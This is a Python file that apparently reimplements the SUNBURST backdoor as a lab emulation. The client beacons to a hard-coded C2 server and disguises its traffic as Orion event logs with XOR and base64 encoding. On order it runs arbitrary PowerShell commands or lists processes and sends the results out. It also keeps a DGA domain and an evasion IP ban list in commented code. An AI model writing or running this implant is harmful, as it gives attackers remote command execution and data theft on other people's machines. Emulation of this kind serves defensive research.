import os
import socket
import sys
import requests
import random
import time
import binascii
import re
import psutil
import json
import base64
import subprocess
import struct
import zlib
import string

from dns import resolver
from datetime import datetime
from psutil import AccessDenied

#main_url = "http://192.168.132.2:8081/"
main_url = "http://10.2.232.200:8081/"

domain_name = "i32hu6i32hu6.appsync-api.us-east-2.avsvmcloud.com" # = output of DGA algo

ban_ip = [
    "10.0.0.0",
    "172.16.0.0",
    "192.168.0.0",
    "224.0.0.0",
    "20.140.0.0",
    "96.31.172.0",
    "131.228.12.0",
    "144.86.226.0",
    ]

ban_ip_range = [["fc00", "fe00"], ["fec0", "ffc0"], ["ff00", "ff00"]]


def execute_order(order, additional_data_received = ""):
  """
  execute order from the c2 server
  Only the order n°6 can be execute now : Returns a process listing. If no arguments are provided returns just the PID and process name.
  """
  if order == str(6):
    dico_process =  {}
    for proc in psutil.process_iter():
        try:
            dico_process[proc.name().split(".")[0].lower()] = proc.pid # it's necessary to split in order to remove potentially ".exe"

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    return json.dumps(dico_process)

  elif order == str(5):
    try:
      list_arguments = ["powershell.exe"] + additional_data_received.strip().split()
      print("Command Input : ",list_arguments)
      result_command = subprocess.run(list_arguments, capture_output=True, check=True).stdout
      print("Result command : ", result_command)
    except Exception as e:
      print("Error while executing the command of the C2 server : ", e)
      return ""

    return json.dumps({additional_data_received:result_command.decode("ISO-8859-1")})

  elif order == str(1):
    print("CLIENT KILLED !")
    sys.exit(0)

  else:
    return ""


def send_receive_request(url, order_received = None, additional_data_received = ""):
  global main_url

  session_id = ''.join(random.choice(string.ascii_lowercase)[:10] for _ in range(10))

  if order_received is None:
    step_list = []
  else:
    string_to_send = execute_order(order_received, additional_data_received)

    print("The program send this data : ", string_to_send)

    answer_program_string = binascii.hexlify(string_to_send.encode("ISO-8859-1")).decode("ISO-8859-1")
    xor_byte = ord(session_id[0])
    answer_message_xor = "".join([chr(ord(cs) ^ xor_byte) for cs in answer_program_string])

    list_message_to_c2 = []
    for k in range(0, len(answer_message_xor), 10):
      list_message_to_c2.append(base64.b64encode(answer_message_xor[k:k+10].encode("ISO-8859-1")).decode("ISO-8859-1"))

    step_list = []
    for message_instance in range(len(list_message_to_c2)):
      step_list.append(  # cf pictures in https://www.mandiant.com/resources/sunburst-additional-technical-details
        {
          "Index":message_instance,
          "Succeeded": str(True),
          "Timestamp": str(int(datetime.timestamp(datetime.now()))),
          "DurationMs": str(0),
          "EventName": "EventManager",
          "EventType": "Orion",
          "Message": str(list_message_to_c2[message_instance])
        }
      )

  print(session_id)
  data_total_to_c2 = {
    "sessionID":session_id,
    "userID":''.join(random.choice(string.ascii_lowercase)[:10] for _ in range(10)),
    "steps": step_list
    }

  request = requests.post(url, json = data_total_to_c2)

  if (request.status_code == 200) and step_list != []:
    print("Data requested has been send to C2 server and a new order has been requested :)")

  elif (request.status_code == 200) and step_list == []:
    print("Order requested by the program to the C2 server")

  else:
    print("error when sending the data requested by the C2 server")

  body_request = request.text

  regex_list = re.findall(r"""[0-9a-f-]{36}|[0-9a-f]{32}|[0-9a-f]{16}""", body_request)


  print("Strings found with regex : ", regex_list)

  regex_string = "".join([k.replace("-", "") for k in regex_list])

  byte_message = ord(body_request[0]) # necessary to change that, the first byte may not be the same

  message_hex = binascii.unhexlify(regex_string.encode("ISO-8859-1"))

  zobj = zlib.decompressobj()
  decompressed_message = zobj.decompress(message_hex).decode("ISO-8859-1")

  message_plain_text = "".join([chr(ord(cs) ^ byte_message) for cs in decompressed_message])

  #message_plain_text = binascii.unhexlify(unxored_message).decode("ISO-8859-1")

  print("Message plain text received : ", message_plain_text)

  len_message = int(message_plain_text[:2])
  print(len_message)

  command = message_plain_text[2]
  print("The number of the order sent by the C2 server is : ", command)

  if len_message > 3:
    additional_data_received = message_plain_text[3:len_message]
    print("Additional Data : ", additional_data_received)
  else:
    additional_data_received = ""

  return command, additional_data_received


def main():
  print("initialisation du client")

  ## Finding 'A' Record

  # try:
  #   result_a_query = resolver.query(domain_name, 'A')
  #   for result in result_a_query:
  #     ip_dga = result.to_text()
  #     print("A record for IP fom DGA : ", ip_dga)
  #   stop = False
  #   if ":" not in ip_dga:
  #     if ip_dga in ban_ip:
  #       stop=True

  #   else:
  #     for [min_ip, max_ip] in ban_ip_range:
  #       if ip_dga[:4] >= min_ip and ip_dga[:4] <= max_ip:
  #         stop=True

  #   if stop == True:
  #     print("STOP, detection of a banned IP")
  #     sys.exit(0)

  # except Exception as e:
  #   print("Error A request ", e)
  #   pass





  # ##Finding CNAME Value
  # try:
  #   result_cname_query = resolver.query(domain_name, 'CNAME')
  #   for result in result_cname_query:
  #     domain_name_c2 = result.to_text()
  #   print("Domain Name C2 Server : ", domain_name_c2)

  # except Exception as e:
  #   print("Error CNAME request ", e)
  #   pass

  ## First HTTP request with C2 server
  connection = False
  while connection is False:
    try:
      #url="http://192.168.132.2:8081/"
      url = main_url
      first_request = requests.get(url)

      if first_request.status_code == 200:
        print("Http request succeed")
        connection = True
      else:
        print("Http request failed : ", first_request.status_code)
        time.sleep(random.randint(10,20))

    except Exception as e:
        print("Http request failed : ", e)
        time.sleep(random.randint(10,20))

  print("Http request succeed")

  order_received = None
  additional_data_received = None

  while 1:
    order_received, additional_data_received = send_receive_request(url, order_received, additional_data_received)
    time.sleep(10)

if __name__=="__main__":
  main()
  sys.exit(0)



